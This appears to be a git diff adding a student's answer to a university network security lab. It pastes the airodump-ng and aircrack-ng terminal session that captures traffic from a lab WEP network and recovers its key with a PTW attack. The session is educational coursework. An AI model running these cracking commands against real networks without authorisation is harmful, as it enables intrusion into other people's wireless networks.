@@ -201,9 +201,62 @@ Notes for this assignment:
 
 	b) Now, let's go ahead and crack this network. First, exit airodump-ng. Document all the steps you take here in a file called exercise2b. Cracking WEP is done by capturing enough packets from a network to enable some cryptographic attacks on the algorithms used. Capturing is also done by airodump-ng: ``` # airodump-ng -c <channel> --bssid <target BSSID> -w outputnetsec mon0 ```
 	Leave this running. Collecting enough packets in the file specified will take a few minutes. Open the manual page for aircrack-ng and read what it does. Identify what option to use to select the target network. This is the only option you really need, but feel free to play around. **Just document what you do.** Run aircrack-ng with the option you need, and the file(s) to which airodump-ng is currently writing its output. **Once again, document what you use.** When the attack finally succeeds, you are provided with the WEP key. **Also document this.** Leave airodump to capture some more data for good measure, 200.000 frames should be more than enough for the next exercise. Then, exit airodump and put the wireless card back into normal mode ``` airmon-ng stop mon0 ```
-	* Answer
+	* ```
+		cs@cs-VirtualBox:~$ sudo airodump-ng -c 1 --bssid C4:E9:84:D7:70:67 -w outputnetsec mon0
+
+		 CH  1 ][ Elapsed: 13 mins ][ 2017-04-20 12:56                                         
+		                                                                                                                                                      
+		 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
+		                                                                                                                                                      
+		 C4:E9:84:D7:70:67  -34  66     4571   182797  198   1  54e  WEP  WEP         netsec-wep                                                              
+		                                                                                                                                                      
+		 BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                            
+		                                                                                                                                                      
+		 C4:E9:84:D7:70:67  00:0F:C9:0C:F7:93  -54   54e-54e    22    47190                                                                                    
+		 C4:E9:84:D7:70:67  00:0F:C9:0C:F7:8C  -56   54e-54e    33    91402                                                                                    
+		 C4:E9:84:D7:70:67  00:0F:C9:0C:EE:ED  -64   54e-11e   930    62588                                                                                    
+		 C4:E9:84:D7:70:67  00:C0:CA:66:01:F9   -1    1 - 0      0       24 
+
+		cs@cs-VirtualBox:~$ aircrack-ng outputnetsec-01.cap
+			Opening outputnetsec-01.cap
+			Read 571974 packets.
+
+			   #  BSSID              ESSID                     Encryption
+
+			   1  C4:E9:84:D7:70:67  netsec-wep                WEP (182798 IVs)
+
+			Choosing first network as target.
+
+			Opening outputnetsec-01.cap
+			Attack will be restarted every 5000 captured ivs.
+			Starting PTW attack with 182798 ivs.
+
+
+			                                 Aircrack-ng 1.2 beta3
+
+
+			                 [00:00:03] Tested 1535537 keys (got 182798 IVs)
+
+			   KB    depth   byte(vote)
+			    0    0/  1   C0(252928) 0D(202752) C6(202752) 05(201216) 55(199424) 
+			    1    0/  1   FF(240128) 2C(198144) FD(198144) 8D(197888) 6B(197376) 
+			    2    0/  1   EE(251136) 8D(199424) 16(198144) 8A(198144) B4(197120) 
+			    3    0/  1   42(251392) 1F(205056) CA(200960) 54(200192) 5B(199936) 
+			    4    0/  1   21(249600) FE(201984) 92(201728) EF(201472) D4(198912) 
+			    5    0/  1   61(262656) FF(199936) 55(198656) 3F(197120) FA(196864) 
+			    6    0/  6   27(199680) 5C(198912) BA(198144) D8(197888) 58(197120) 
+			    7    0/  1   4A(244736) E5(207104) DC(199680) D0(197376) A9(197120) 
+			    8    0/  1   1A(252160) 14(200960) 13(200704) 45(199936) E4(199168) 
+			    9    0/  1   44(247040) 45(202752) B8(197376) 16(197120) E2(197120) 
+			   10    0/  1   05(203008) 4F(202496) EA(197888) FC(197888) 73(197376) 
+			   11    0/  1   6C(204032) 95(199680) 20(198912) BE(197632) 2A(196352) 
+			   12    0/  1   20(221052) 7C(197480) 45(196096) 28(195304) 6A(194212) 
+
+			             KEY FOUND! [ C0:FF:EE:42:21:61:1E:4A:1A:44:6E:2F:20 ] 
+				Decrypted correctly: 100% 
 
 3. a) We now have the WEP key, but we also have a generous chunk of data from the network to work with.	Let's work with that and see what we can learn from the network. In exercise 2 you had airodump-ng write its output to a few files, all prefixed with "outputnetsec". In the folder where you ran airodump, you should now see at least a file called outputnetsec-01.cap. Start wireshark. Since we're not going to capture anything, you can run it as a normal user. In wireshark, open the file outputnetsec-01.cap. ** Create a folder called exercise3. Describe what you see in wireshark, after opening the capture file, in a file called exercise3a in that folder. Try to explain why there is very little useful information in this capture file.
+
 	* Answer
 
 	b) There is some useful information, however, and we are going to try to extract that. Wireshark has several very nice analysis tools built into it. They can be accessed in the ** Analyze** and **Statistics** menus. Play around with the tools in the top part of the **Statistics** menu. **Document which clients appear to be most active on the network and whom they seem to be communicating with, in a file called exercise3b. Also add the output from the Comments Summary tool, and try to explain why the Protocol Hierarchy looks the way it does.** If you see more than a few very active clients, limit your description to the clients you identified in the previous exercise as connected to the network. If you protocol hierarchy contains more than a few reasonably explainable protocols, there's something wrong with your encrypted capture.
